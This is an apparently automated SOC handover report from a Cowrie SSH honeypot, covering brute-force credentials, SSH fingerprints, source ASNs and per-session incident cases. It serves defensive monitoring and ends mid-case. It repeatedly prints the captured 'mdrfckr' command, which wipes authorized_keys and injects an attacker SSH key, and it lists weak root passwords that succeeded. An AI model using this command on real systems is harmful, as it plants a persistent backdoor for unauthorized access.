# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-01 |
| **Generated At** | 2026-05-01T11:10:41Z |
| **Shift Time** | 11:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **501** |
| Confirmed Threats | **181** |
| False Positives Filtered | **320** (63.9%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **13** |
| High Severity Cases | **50** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **451** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **119** |
| Unique Credential Pairs | **68** |
| Unique Usernames | **28** |
| Unique Passwords | **68** |
| Successful Auth Pairs | **28** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 50 |
| `345gs5662d34` | 25 |
| `ubuntu` | 7 |
| `admin` | 6 |
| `test` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 25 |
| `3245gs5662d34` | 25 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `$4` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 25 |
| `root` | `3245gs5662d34` | 25 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `hduser123456789` | `159.223.94.92` | 2026-05-01T10:09:09 |
| `root` | `3245gs5662d34` | `159.223.94.92` | 2026-05-01T10:09:12 |
| `root` | `oracle@123` | `170.238.160.191` | 2026-05-01T10:28:51 |
| `root` | `3245gs5662d34` | `170.238.160.191` | 2026-05-01T10:28:58 |
| `root` | `admin001` | `170.238.160.191` | 2026-05-01T10:33:03 |
| `root` | `cron` | `135.125.226.120` | 2026-05-01T10:40:47 |
| `root` | `3245gs5662d34` | `135.125.226.120` | 2026-05-01T10:40:51 |
| `root` | `Qazwsxedc123456` | `135.125.226.120` | 2026-05-01T10:41:38 |
| `root` | `test1test` | `170.238.160.191` | 2026-05-01T10:42:22 |
| `root` | `QAZ123456` | `135.125.226.120` | 2026-05-01T10:42:30 |
| `root` | `Admin@12#$` | `135.125.226.120` | 2026-05-01T10:43:18 |
| `root` | `passw.moses.10` | `135.125.226.120` | 2026-05-01T10:44:07 |
| `root` | `123abc!@` | `135.125.226.120` | 2026-05-01T10:44:55 |
| `root` | `global123` | `135.125.226.120` | 2026-05-01T10:47:21 |
| `root` | `!Q2w3e4r!` | `135.125.226.120` | 2026-05-01T10:49:00 |
| `root` | `zxc!@#123` | `135.125.226.120` | 2026-05-01T10:49:51 |
| `root` | `1234QWERasdf` | `135.125.226.120` | 2026-05-01T10:51:26 |
| `root` | `root82` | `135.125.226.120` | 2026-05-01T10:52:16 |
| `root` | `zabbix` | `135.125.226.120` | 2026-05-01T10:53:07 |
| `root` | `kingkong` | `135.125.226.120` | 2026-05-01T10:53:59 |
| `root` | `mohammad` | `135.125.226.120` | 2026-05-01T10:54:49 |
| `root` | `ZAQ!xsw2` | `135.125.226.120` | 2026-05-01T10:56:29 |
| `root` | `!@#$%%$#@!` | `135.125.226.120` | 2026-05-01T10:58:05 |
| `root` | `asdf#1234` | `135.125.226.120` | 2026-05-01T10:58:55 |
| `root` | `mudar123` | `135.125.226.120` | 2026-05-01T10:59:44 |
| `root` | `Qwertyui1234` | `135.125.226.120` | 2026-05-01T11:00:34 |
| `root` | `Su123456@` | `135.125.226.120` | 2026-05-01T11:01:28 |
| `root` | `1234rewq` | `135.125.226.120` | 2026-05-01T11:02:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **501** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 112 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 111 | 3 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 111 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 25 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `170.238.160.191`, `135.125.226.120`, `159.223.94.92`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **19** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 2 | HIGH |
| `AS7018` | AT&T Enterprises, LLC | 1 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | LOW |
| `AS55293` | A2 Hosting, Inc. | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS13213` | THG HOSTING LIMITED | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (50)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be26578e6c75

| Field | Detail |
|---|---|
| **Source IP** | `159.223.94[.]92` |
| **First Seen** | 2026-05-01 10:09 |
| **Last Seen** | 2026-05-01 10:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:09:08` | `cowrie.session.connect` |
| `2026-05-01 10:09:08` | `cowrie.client.version` |
| `2026-05-01 10:09:09` | `cowrie.client.kex` |
| `2026-05-01 10:09:09` | `cowrie.login.success` |
| `2026-05-01 10:09:09` | `cowrie.session.params` |
| `2026-05-01 10:09:09` | `cowrie.command.input` |
| `2026-05-01 10:09:09` | `cowrie.command.failed` |
| `2026-05-01 10:09:09` | `cowrie.log.closed` |
| `2026-05-01 10:09:10` | `cowrie.session.params` |
| `2026-05-01 10:09:10` | `cowrie.command.input` |
| `2026-05-01 10:09:10` | `cowrie.session.file_download` |
| `2026-05-01 10:09:10` | `cowrie.log.closed` |
| `2026-05-01 10:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.94[.]92` to AbuseIPDB if not already reported
- [ ] Block `159.223.94[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba64c4b410dc

| Field | Detail |
|---|---|
| **Source IP** | `159.223.94[.]92` |
| **First Seen** | 2026-05-01 10:09 |
| **Last Seen** | 2026-05-01 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:09:12` | `cowrie.session.connect` |
| `2026-05-01 10:09:12` | `cowrie.client.version` |
| `2026-05-01 10:09:12` | `cowrie.client.kex` |
| `2026-05-01 10:09:12` | `cowrie.login.success` |
| `2026-05-01 10:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.94[.]92` to AbuseIPDB if not already reported
- [ ] Block `159.223.94[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9dfc801e99c

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-05-01 10:28 |
| **Last Seen** | 2026-05-01 10:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:28:49` | `cowrie.session.connect` |
| `2026-05-01 10:28:49` | `cowrie.client.version` |
| `2026-05-01 10:28:49` | `cowrie.client.kex` |
| `2026-05-01 10:28:51` | `cowrie.login.success` |
| `2026-05-01 10:28:51` | `cowrie.session.params` |
| `2026-05-01 10:28:51` | `cowrie.command.input` |
| `2026-05-01 10:28:51` | `cowrie.command.failed` |
| `2026-05-01 10:28:52` | `cowrie.log.closed` |
| `2026-05-01 10:28:52` | `cowrie.session.params` |
| `2026-05-01 10:28:52` | `cowrie.command.input` |
| `2026-05-01 10:28:53` | `cowrie.session.file_download` |
| `2026-05-01 10:28:53` | `cowrie.log.closed` |
| `2026-05-01 10:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45bb9e4f34c9

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-05-01 10:28 |
| **Last Seen** | 2026-05-01 10:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:28:56` | `cowrie.session.connect` |
| `2026-05-01 10:28:56` | `cowrie.client.version` |
| `2026-05-01 10:28:57` | `cowrie.client.kex` |
| `2026-05-01 10:28:58` | `cowrie.login.success` |
| `2026-05-01 10:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b74f3ddd1fe

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-05-01 10:33 |
| **Last Seen** | 2026-05-01 10:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:33:01` | `cowrie.session.connect` |
| `2026-05-01 10:33:01` | `cowrie.client.version` |
| `2026-05-01 10:33:01` | `cowrie.client.kex` |
| `2026-05-01 10:33:03` | `cowrie.login.success` |
| `2026-05-01 10:33:03` | `cowrie.session.params` |
| `2026-05-01 10:33:03` | `cowrie.command.input` |
| `2026-05-01 10:33:03` | `cowrie.command.failed` |
| `2026-05-01 10:33:04` | `cowrie.log.closed` |
| `2026-05-01 10:33:04` | `cowrie.session.params` |
| `2026-05-01 10:33:04` | `cowrie.command.input` |
| `2026-05-01 10:33:05` | `cowrie.session.file_download` |
| `2026-05-01 10:33:05` | `cowrie.log.closed` |
| `2026-05-01 10:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e9d55fddad

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-05-01 10:33 |
| **Last Seen** | 2026-05-01 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:33:08` | `cowrie.session.connect` |
| `2026-05-01 10:33:08` | `cowrie.client.version` |
| `2026-05-01 10:33:09` | `cowrie.client.kex` |
| `2026-05-01 10:33:10` | `cowrie.login.success` |
| `2026-05-01 10:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6eec5d5504d

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:40 |
| **Last Seen** | 2026-05-01 10:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:40:46` | `cowrie.session.connect` |
| `2026-05-01 10:40:46` | `cowrie.client.version` |
| `2026-05-01 10:40:46` | `cowrie.client.kex` |
| `2026-05-01 10:40:47` | `cowrie.login.success` |
| `2026-05-01 10:40:47` | `cowrie.session.params` |
| `2026-05-01 10:40:47` | `cowrie.command.input` |
| `2026-05-01 10:40:47` | `cowrie.command.failed` |
| `2026-05-01 10:40:47` | `cowrie.log.closed` |
| `2026-05-01 10:40:48` | `cowrie.session.params` |
| `2026-05-01 10:40:48` | `cowrie.command.input` |
| `2026-05-01 10:40:48` | `cowrie.session.file_download` |
| `2026-05-01 10:40:48` | `cowrie.log.closed` |
| `2026-05-01 10:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ac28002381

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:40 |
| **Last Seen** | 2026-05-01 10:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:40:50` | `cowrie.session.connect` |
| `2026-05-01 10:40:50` | `cowrie.client.version` |
| `2026-05-01 10:40:50` | `cowrie.client.kex` |
| `2026-05-01 10:40:51` | `cowrie.login.success` |
| `2026-05-01 10:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0113ab0e6cc

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:41 |
| **Last Seen** | 2026-05-01 10:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:41:38` | `cowrie.session.connect` |
| `2026-05-01 10:41:38` | `cowrie.client.version` |
| `2026-05-01 10:41:38` | `cowrie.client.kex` |
| `2026-05-01 10:41:38` | `cowrie.login.success` |
| `2026-05-01 10:41:38` | `cowrie.session.params` |
| `2026-05-01 10:41:38` | `cowrie.command.input` |
| `2026-05-01 10:41:38` | `cowrie.command.failed` |
| `2026-05-01 10:41:39` | `cowrie.log.closed` |
| `2026-05-01 10:41:39` | `cowrie.session.params` |
| `2026-05-01 10:41:39` | `cowrie.command.input` |
| `2026-05-01 10:41:39` | `cowrie.session.file_download` |
| `2026-05-01 10:41:39` | `cowrie.log.closed` |
| `2026-05-01 10:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aeccc56beb1

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:41 |
| **Last Seen** | 2026-05-01 10:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:41:41` | `cowrie.session.connect` |
| `2026-05-01 10:41:41` | `cowrie.client.version` |
| `2026-05-01 10:41:41` | `cowrie.client.kex` |
| `2026-05-01 10:41:42` | `cowrie.login.success` |
| `2026-05-01 10:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c79369f86021

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-05-01 10:42 |
| **Last Seen** | 2026-05-01 10:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:42:20` | `cowrie.session.connect` |
| `2026-05-01 10:42:20` | `cowrie.client.version` |
| `2026-05-01 10:42:20` | `cowrie.client.kex` |
| `2026-05-01 10:42:22` | `cowrie.login.success` |
| `2026-05-01 10:42:22` | `cowrie.session.params` |
| `2026-05-01 10:42:22` | `cowrie.command.input` |
| `2026-05-01 10:42:22` | `cowrie.command.failed` |
| `2026-05-01 10:42:23` | `cowrie.log.closed` |
| `2026-05-01 10:42:23` | `cowrie.session.params` |
| `2026-05-01 10:42:23` | `cowrie.command.input` |
| `2026-05-01 10:42:24` | `cowrie.session.file_download` |
| `2026-05-01 10:42:24` | `cowrie.log.closed` |
| `2026-05-01 10:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4901290f609c

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-05-01 10:42 |
| **Last Seen** | 2026-05-01 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:42:27` | `cowrie.session.connect` |
| `2026-05-01 10:42:27` | `cowrie.client.version` |
| `2026-05-01 10:42:28` | `cowrie.client.kex` |
| `2026-05-01 10:42:29` | `cowrie.login.success` |
| `2026-05-01 10:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99806ffa80e8

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:42 |
| **Last Seen** | 2026-05-01 10:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
